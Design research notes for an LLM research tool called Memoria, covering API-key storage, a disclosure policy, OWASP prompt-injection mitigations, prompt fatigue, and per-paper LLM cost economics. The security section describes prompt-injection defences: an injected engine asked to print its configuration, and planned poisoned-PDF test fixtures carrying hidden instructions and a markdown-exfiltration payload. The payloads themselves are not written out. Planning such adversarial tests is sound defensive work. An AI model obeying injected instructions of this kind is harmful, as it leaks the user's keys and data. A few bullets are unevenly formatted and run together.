- **Store API keys in the OS credential store (keychain/DPAPI/libsecret), never in app config files or user-visible documents; document the fallback behavior where no secret store exists.**
  - Evidence: Electron's safeStorage docs: macOS Keychain keys are protected from other apps; Windows DPAPI protects from other users but not same-user apps; on Linux the backend varies (kwallet/gnome-libsecret) and where none exists values are 'encrypted' with a hardcoded plaintext password (detectable via getSelectedStorageBackend() === 'basic_text'). Claude Code's shipped behavior (verified on its security page): 'API keys and tokens are stored in the macOS Keychain when available, and protected by file permissions on Windows and Linux.'
  - Source: https://www.electronjs.org/docs/latest/api/safe-storage and https://code.claude.com/docs/en/security
  - Beta.1 implication: Inference: beta.1 rule — the LLM API key must never live inside the vault (Memoria's keep-test means vault files get synced, shared, and exported; a key in a note or plugin-visible config leaks). Use OS keychain where available, 0600-permission file outside the vault otherwise, and state which in the docs. Additionally: the key must be invisible to engine contexts (an injected engine asked to 'print your configuration' must have nothing to print), and export bundles must be verified key-free — that is a one-line check in the export path.
- **Publish a vulnerability-disclosure policy (SECURITY.md) at beta: contact channel, scope, response expectation, safe harbor — the norm even for small projects, per OWASP and CISA templates.**
  - Evidence: OWASP Vulnerability Disclosure Cheat Sheet and the CISA VDP template define the minimum: how to report privately, what's in scope, expected response time, commitment not to pursue good-faith researchers, disclosure timeline norms (typically 60–120 days). GitHub surfaces SECURITY.md natively. Claude Code models the same at product level (private HackerOne reporting, 'allow time before public disclosure').
  - Source: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html and https://www.cisa.gov/vulnerability-disclosure-policy-template
  - Beta.1 implication: Inference: beta.1 ships a SECURITY.md sized for one maintainer: private email/GitHub security advisories for reports, honest response window (e.g., acknowledge in 7 days), scope = the app and its engine pipeline, no bounty. Crucially for this product, the same doc should carry the data-flow disclosure users of an LLM research tool actually need: exactly what vault text leaves the machine per engine call, to which API vendor, under what retention terms — Claude Code's security page pairs its safeguards with retention/privacy links for precisely this reason.
- **OWASP LLM Top 10 (2025) treats prompt injection (LLM01) as unsolvable-by-filtering; sanctioned mitigations are defense-in-depth: least-privilege tooling, segregating external content, constraining output formats, human approval only for HIGH-RISK actions, and regular adversarial testing.**
  - Evidence: OWASP GenAI Top 10 2025: LLM01 mitigations = constrain behavior via system prompts, define expected output formats, segregate untrusted content, least-privilege tool access, human-in-the-loop for consequential operations, adversarial testing. Notably it does NOT prescribe per-item human review of model outputs — approval is reserved for privileged/irreversible actions.
  - Source: https://genai.owasp.org/ (2025 list; summarized across https://www.promptfoo.dev/docs/red-team/owasp-llm-top-10/ and https://aembit.io/blog/owasp-top-10-llm-risks-explained/)
  - Beta.1 implication: Inference: OWASP's position validates Memoria's 'checked means checks passed, never approved' epistemics — the industry standard reserves human gates for high-consequence actions (bulk destructive ops, external sends), not routine writes. Beta.1's compliance-with-best-practice claim can therefore be: typed/validated engine outputs (output-format constraint), per-engine least-privilege tools, trust-segregated retrieval, and a small adversarial fixture suite in the eval plan. That last item is the only genuinely new work: 3–5 poisoned-PDF fixtures (hidden instructions, markdown-exfil payload, scope-violation attempt) run through ingestion as part of the beta.1 evaluation.
- **Design against prompt fatigue deliberately: vendors treat over-prompting as a security failure mode, because habituated users click through everything.**
  - Evidence: Claude Code ships 'prompt fatigue mitigation' (allowlisting safe commands per-user/per-codebase) and auto mode as named features; Anthropic's auto-mode engineering post frames skipping permissions safely as a design goal (catching ~83% of overeager behaviors pre-execution). OpenAI's Atlas guidance similarly reserves step-up confirmation for sensitive actions only. MCP scope-minimization guidance warns 'users decline dialogs listing excessive scopes' (consent abandonment).
  - Source: https://www.anthropic.com/engineering/claude-code-auto-mode and https://code.claude.com/docs/en/security
  - Beta.1 implication: Inference: for Memoria — whose dominant risk is abandonment — this is the security finding that protects the product: adding per-item approvals in the name of safety would be both against the product's identity AND against 2025-2026 state of practice, which has moved decisively toward autonomy-with-containment (scoped writes, egress control, audit trail) over consent dialogs. Beta.1's single audit log of every engine call and vault write serves three masters at once: security monitoring, provenance, and the effectiveness evaluation the milestone exists to perform.

### Unit economics of LLM-powered research tools: per-paper/per-query costs, spend caps and communication patterns, local-vs-API tradeoffs in 2026, and academic willingness to pay

Verified 2026 unit economics for an LLM research tool like Memoria: per-paper digest cost is model-dominated and spans ~$0.005-$1.00 (published per-doc figures plus current Claude pricing of $1-$5/MTok input across Haiku→Opus); embeddings are negligible (~$0.0005/paper at $0.02/M); Batch API (-50%) and prompt caching (~-90% on repeated input) roughly quarter naive ingestion cost. The expensive unit is deep synthesis: OpenAI Deep Research measures at ~$1-10+ per query (Artificial Analysis spent $100 on 10 o3 queries), which is the cost shape of Memoria's compose-flow analysis. Willingness to pay is tightly bounded: academic tools cluster at $9-20/mo (Consensus, SciSpace, scite, Undermind), Elicit tops out at $49/mo Pro, and Wiley's 2025 survey shows 70% of researchers default to free tools even when paid ones are available — so the null workflow costs $0-20/mo and beta.1 must price-justify against it. Spend-control practice from shipping products: Cursor's user-set spend limit with explicit at-limit behavior, and Perplexity's degrade-to-cheaper-model ladder rather than hard stops; market leaders hide unit costs behind opaque credits, which BYOK Memoria can beat with true dollar metering. 2026 self-hosting break-even (tens of millions of tokens/day) confirms API-for-engines/local-for-tests as settled. Concrete beta.1 implications: per-stage model tiers with Batch+caching on ingestion; a default ~$20/mo soft budget with meter, cost preview on compose runs, and a defined degradation ladder ending at Memoria's free deterministic core; and per-operation cost fields written into provenance from day one, since unit-economics measurement is part of what beta.1 exists to evaluate.

- **Per-document LLM processing cost is dominated by model choice, spanning three orders of magnitude**
  - Evidence: Published 2026 figures for document extraction/summarization pipelines: Gemini Flash-class ~$0.00017/page, mid-tier reasoning models $0.01-$0.05/page, GPT-4o-class up to $0.50/page (Parsli cost breakdown); pipeline-comparison blogs cite ~$0.005/doc (Gemini Pro) vs ~$0.10/doc (Claude Opus) for a typical extraction, an ~18x spread; a 10k-token contract summarized with GPT-4o costs ~$0.037. EVIDENCE: published figures. INFERENCE: a 20-30k-token academic paper run through a 2-3-pass digest pipeline costs roughly $0.05-$0.15 on Haiku-class, $0.30-$0.60 on Sonnet-class, $0.50-$1.00 on Opus-class models at verified 2026 prices.
  - Source: https://parsli.co/blog/real-cost-llm-ocr-document-extraction ; https://pecollective.com/blog/llm-api-pricing-comparison/ ; https://www.cloudzero.com/blog/llm-api-pricing-comparison/
  - Beta.1 implication: Beta.1's information-flow (catalog → extract → digest → wiki page) has a knowable per-paper cost envelope of roughly $0.05-$1.00 depending on model tier. Make the model tier a per-stage configuration (cheap model for extraction/structuring, expensive model only where judgment matters) and publish the expected per-paper cost as a first-class number in the design, not an afterthought.
- **Embedding costs are negligible relative to generation; the cost story is entirely about LLM calls**
  - Evidence: OpenAI text-embedding-3-small is $0.02 per 1M tokens ($0.01 with Batch API), verified against official docs as of April 2026. EVIDENCE: pricing pages. INFERENCE: embedding a full 25k-token paper costs ~$0.0005; embedding a 1,000-paper corpus costs under $1 total.
  - Source: https://tokenmix.ai/blog/openai-embedding-pricing ; https://developers.openai.com/api/docs/pricing ; https://costgoat.com/pricing/openai-embeddings
  - Beta.1 implication: Keeping embeddings/NLI local (as Memoria's constraints allow) is a privacy decision, not a cost decision — it saves cents. Do not spend beta.1 engineering effort optimizing embedding cost; spend it on metering and capping generation calls, which is where 99%+ of spend lives.
- **Batch APIs (50% discount) and prompt caching (~90% off cached input) are the two standard cost levers for document pipelines**
  - Evidence: Anthropic Batch API processes requests asynchronously at 50% of standard prices (most batches complete within 1 hour); prompt cache reads bill at ~0.1x input price (writes 1.25x); current Claude pricing: Opus 4.8 $5/$25, Sonnet $3/$15, Haiku 4.5 $1/$5 per MTok. OpenAI Batch similarly halves embedding and completion prices. Cost-engineering blogs independently identify prompt caching as 'the single fastest cost reduction available' on high-volume document pipelines. EVIDENCE: official pricing documentation (verified via the claude-api skill, cached 2026-06) and engineering blogs.
  - Source: Anthropic API pricing and Batch/prompt-caching documentation (https://platform.claude.com/docs/en/pricing, verified via claude-api skill) ; https://pecollective.com/blog/llm-token-pricing-guide/
  - Beta.1 implication: Memoria's digest flow is not latency-sensitive — a paper digested overnight is fine. Beta.1 should route ingestion through the Batch API by default (halves per-paper cost) and cache the paper's full text across the multiple passes of the digest pipeline (extraction, digest, wiki-page, annotation anchoring), cutting repeated-input cost ~90%. Together these roughly quarter the naive per-paper cost.
- **Deep-research/synthesis queries are the expensive unit — $1-$10+ per query, 100-1000x a standard completion**
  - Evidence: OpenAI's Deep Research API: o3-deep-research $10/M input, $40/M output; Artificial Analysis measured $100 across 10 test queries on o3 (~$10/query average, up to ~$30/call) and $9.18 for the same 10 on o4-mini; a query triggers 10-30 web searches and runs 5-30 minutes. Beta.1 should treat compose-flow analysis as a deliberate, cost-previewed action ('this will cost ~$X, proceed?') rather than an ambient background operation — and measure the actual distribution during beta.

Because Memoria is BYOK (user pays the API directly), beta.1 can differentiate by showing true dollar costs per operation — a transparency the credit-based competitors structurally cannot offer.

- **Spend control pattern A — user-set budget with explicit at-limit behavior (Cursor)**
  - Evidence: Cursor bills actual token consumption against an included-usage pool; when it is spent, behavior depends on whether the user set a spend limit in Settings → Billing: with a limit, usage stops at the cap; without one, overage bills automatically in arrears at API rates. Silent in-arrears billing is the anti-pattern for an abandonment-sensitive product; surprise bills are a documented churn driver.
- **Spend control pattern B — degradation ladder: fall back to a cheaper model instead of blocking (Perplexity free tier)**
  - Evidence: Perplexity free users get ~5 Pro Searches/day using frontier models (GPT-4/Claude-class); once consumed, further searches route through the basic model until quota reset — service degrades rather than stops. Claude's own consumer plans instead hard-throttle (5-hour rolling window + weekly caps), which generates documented user frustration. EVIDENCE: product behavior documented by third parties; Perplexity's own rate-limit docs describe the tiering.

Memoria is unusually well-positioned for this because its deterministic operations and local embeddings keep the product useful at $0 — the offline/keep-test constraint doubles as the bottom rung of the ladder.
- **Per-operation cost telemetry at call time, because monthly billing surprises are the canonical failure mode**
  - Evidence: The Parsli engineering account frames the core problem as seeing 'the $0.13/page problem immediately instead of discovering it weeks later in billing'; their two-phase redesign (dedicated OCR + cheaper LLM for structuring) cut costs ~60x. - **In 2026, self-hosting LLM inference only beats APIs at tens of millions of tokens per day; APIs win for ~95% of workloads**
  - Evidence: Multiple independent 2026 TCO analyses converge: break-even vs frontier APIs at ~100-256M tokens/month, vs budget APIs at billions of tokens/month; hidden costs (10-20 engineering hours/month, orchestration infra) make real self-hosting cost 3-5x raw GPU price; consensus recommendation is self-host only above ~10M tokens/day with hard data-residency needs. EVIDENCE: multiple named cost analyses. INFERENCE: a single researcher ingesting even 1,000 papers/year consumes ~25-75M tokens per YEAR — two to three orders of magnitude below break-even.
  - Source: https://www.sitepoint.com/local-llms-vs-cloud-api-cost-analysis-2026/ ; https://tokenmix.ai/blog/self-host-llm-vs-api ; https://renezander.com/guides/self-hosted-llm-vs-api/
  - Beta.1 implication: Memoria's existing stance (live engines call a paid API; local qwen is a test fixture only) is confirmed as the correct 2026 economics for a single-user tool — beta.1 should not build local inference for cost reasons. The only defensible local components are those chosen for privacy (embeddings, NLI), which are also the cheap ones. State this as a settled decision in the beta.1 design so it doesn't get relitigated.
- **BYOK (bring-your-own-key) is the established cost model for local-first knowledge tools, but it shifts budget enforcement onto the app**
  - Evidence: VS Code (official blog), Warp (docs), JetBrains (tracked feature request), Obsidian plugins (LLM Workspace, Literature Review Synthesizer — 'your notes and API key never leave your machine'), and llm-for-zotero all use user-supplied API keys with the provider billing the user directly; billing transparency comes from the provider's own dashboard and per-key usage tracking. EVIDENCE: product documentation and plugin descriptions. INFERENCE: provider dashboards aggregate across uses of the key and lag, so an app-level meter is still required for per-workflow attribution and real-time budget enforcement.
  - Source: https://code.visualstudio.com/blogs/2025/10/22/bring-your-own-key ; https://docs.warp.dev/agent-platform/inference/bring-your-own-api-key/ ; https://github.com/yilewang/llm-for-zotero ; https://www.obsidianstats.com/plugins/llm-workspace
  - Beta.1 implication: BYOK fits Memoria exactly (single user, local-first, files survive the tool, no vendor middleman marking up tokens). Beta.1 should ship BYOK with: its own real-time meter (from the provenance cost fields), a recommendation that the user also set a hard provider-side org spend limit as a backstop, and setup docs that state expected monthly cost up front — because with BYOK the first bill is the user's problem, and surprise there feeds the abandonment risk directly.
